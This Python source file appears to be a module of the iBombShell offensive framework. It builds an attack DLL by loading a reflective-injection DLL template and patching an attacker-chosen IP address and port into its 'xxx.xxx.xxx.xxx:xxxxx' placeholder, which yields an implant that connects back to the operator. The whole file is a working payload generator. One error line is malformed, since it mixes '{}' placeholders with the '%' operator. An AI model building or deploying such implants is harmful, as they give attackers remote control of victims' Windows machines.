from termcolor import colored, cprint
from module import ModuleGenerate
from printib import print_ok, print_info, print_error
from os import system, remove, path

class CustomModule(ModuleGenerate):

    def __init__(self):
        information = {"Name": "Generate DLL iBombShell ",
                       "Description": "This module generates an iBombShell DLL",
                       "base_dll": "https://github.com/stephenfewer/ReflectiveDLLInjection",
                       "Author": "@josueencinar"}
        opts = {"output": [None, "Specify the file where you want to compile the DLL", True],
                "arch": ["x64", "Specify system architecture (x86/x64)", True]}
        # Constructor of the parent class
        super(CustomModule, self).__init__(information, opts)
        del self.options["base64"]

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        ps_code = "{}:{}".format(self.args["ip"], self.args["port"])
        try:
            self.generate_dll(ps_code.encode(), self.args["arch"])
        except Exception as e:
            raise Exception(e)
        
    def generate_dll(self, ps_code, arch="x64"):
        """
        Thanks to Empire for the concept.
        """
        template_dll = "./dll_templates/"
        if arch.lower() == 'x86':
            template_dll += "reflective_x86.dll"
        elif arch.lower() == 'x64':
            template_dll += "reflective_x64.dll"
        else:
            raise Exception("Wrong Architecture (x86/x64)")
        
        if path.isfile(template_dll):
            dll_raw = None
            with open(template_dll, 'rb') as f:
                dll_raw = f.read()

            if dll_raw:
                code = b"xxx.xxx.xxx.xxx:xxxxx"
                index = dll_raw.find(code)
                dif = len(code) - len(ps_code)
                ps_code = ps_code + (b" "*dif)
                if index == -1:
                    raise Exception("Failure to write the dll")

                dll_patched = dll_raw[:index] + ps_code + dll_raw[(index + len(code)):]
                ff = open(self.args["output"], "wb")
                ff.write(dll_patched)
                print_info("The dll has been generated")
                ff.close()
        else:
            raise Exception("Original .dll for arch {} does not exist!" % (arch))